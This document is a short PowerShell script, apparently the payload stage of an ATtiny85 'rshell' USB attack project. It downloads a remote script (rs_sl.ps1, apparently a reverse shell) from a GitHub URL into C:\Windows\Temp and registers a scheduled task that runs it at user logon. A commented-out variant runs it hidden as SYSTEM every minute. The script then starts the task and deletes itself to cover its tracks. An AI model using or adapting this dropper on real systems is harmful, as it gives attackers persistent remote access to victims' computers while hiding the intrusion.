$client = New-Object System.Net.WebClient
$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/attiny85_rshell/master/rs_sl.ps1', 'C:\\Windows\\Temp\\rs_sl.ps1')

$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like "rs-task" }
if($taskExists) {
   Write-Output "EXISTS";
} else {
   Write-Output "Creating task...";
   #C:\Windows\System32\schtasks.exe /create /tn rs-task /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru System
   $action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\rs_sl.ps1";
   $trigger = New-ScheduledTaskTrigger -AtLogOn;
   $principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName);
   $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
   #$settings = New-ScheduledTaskSettingsSet -Hidden $true;
   Register-ScheduledTask rs-task -InputObject $task;
   Start-ScheduledTask -TaskName rs-task;
   #note so my dumbass doesnt forget how to get rid of scheduled task in powershell.
   #Unregister-ScheduledTask -TaskName rs-task -Confirm:$false
}

Remove-Item $script:MyInvocation.MyCommand.Path -Force;